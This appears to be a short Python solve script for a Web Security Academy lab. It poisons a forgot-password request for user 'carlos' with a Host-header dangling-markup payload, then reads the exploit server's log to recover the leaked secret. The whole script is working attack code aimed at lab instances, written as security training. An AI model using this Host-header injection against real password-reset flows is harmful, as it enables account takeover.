import requests
from bs4 import BeautifulSoup
import re

url = "https://ac191fad1e69e07ac04910e900950036.web-security-academy.net"

url_ex = "https://exploit-acdd1f2c1e82e034c0f7103f017c0033.web-security-academy.net"

def get_csrf(txt):
	soup = BeautifulSoup(txt, 'html.parser')
	token = soup.find_all('input', {'name': 'csrf'})[0].get('value')
	return token

def slove(url, url_ex):
	
	s = requests.session()

	r1 = s.get(url)
	r2 = s.get(url + "/login")

	# print(get_csrf(r2.text))

	data = {'csrf': get_csrf(r2.text), 'username': 'carlos'}

	dangling = 'ac191fad1e69e07ac04910e900950036.web-security-academy.net:\'<a+href="//exploit-acdd1f2c1e82e034c0f7103f017c0033.web-security-academy.net?'
	header = {"Host": dangling}
	r3 = s.post(url+"/forgot-password", data=data, headers=header) 


	r4 = s.get(url_ex + "/log")
	# print(r4.text)
	t = re.findall("d:+.*Thank", r4.text)[-1][3:13]

	print(t)

slove(url, url_ex)
# /forgot-password?temp-forgot-password-token=